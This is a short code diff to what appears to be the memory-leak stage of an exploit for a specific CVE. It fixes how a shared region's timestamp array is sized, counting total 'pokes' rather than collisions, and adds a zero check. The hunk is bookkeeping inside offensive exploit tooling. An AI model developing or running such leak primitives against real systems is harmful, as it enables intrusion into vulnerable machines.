@@ -65,6 +65,8 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         std::size_t collisions = 0U;
         /** How many threads search. */
         std::size_t thread_count = 0U;
+        /** How many entries the timestamp array holds: the retired tree sized it by the\n         *  total pokes a cohort makes, not by the collision count, because every poke is\n         *  recorded before anything is compared. */
+        std::size_t total_pokes = 0U;
         /** The page the parent waits on. */
         std::size_t page_size = 0U;
         /** The width of one address or one timestamp in the region. */
@@ -93,7 +95,8 @@ namespace ghostlock::backend::cve_2026_43499::leak {
                                                               RegionLayout &out) noexcept {
         out = RegionLayout{};
         if (inputs.header_bytes == 0U || inputs.collisions == 0U || inputs.thread_count == 0U ||
-            inputs.page_size == 0U || inputs.word_bytes == 0U || inputs.handle_bytes == 0U) {
+            inputs.page_size == 0U || inputs.word_bytes == 0U || inputs.handle_bytes == 0U ||
+            inputs.total_pokes == 0U) {
             return RegionVerdict::GeometryMissing;
         }
         const std::size_t address_slots = inputs.collisions + 1U;
@@ -101,10 +104,10 @@ namespace ghostlock::backend::cve_2026_43499::leak {
             return RegionVerdict::GeometryMissing;
         }
         const std::size_t address_bytes = address_slots * inputs.word_bytes;
-        const std::size_t time_bytes = inputs.collisions * inputs.word_bytes;
+        const std::size_t time_bytes = inputs.total_pokes * inputs.word_bytes;
         const std::size_t handle_bytes = inputs.thread_count * inputs.handle_bytes;
         if (address_bytes / inputs.word_bytes != address_slots ||
-            time_bytes / inputs.word_bytes != inputs.collisions ||
+            time_bytes / inputs.word_bytes != inputs.total_pokes ||
             handle_bytes / inputs.handle_bytes != inputs.thread_count) {
             return RegionVerdict::GeometryMissing;
         }
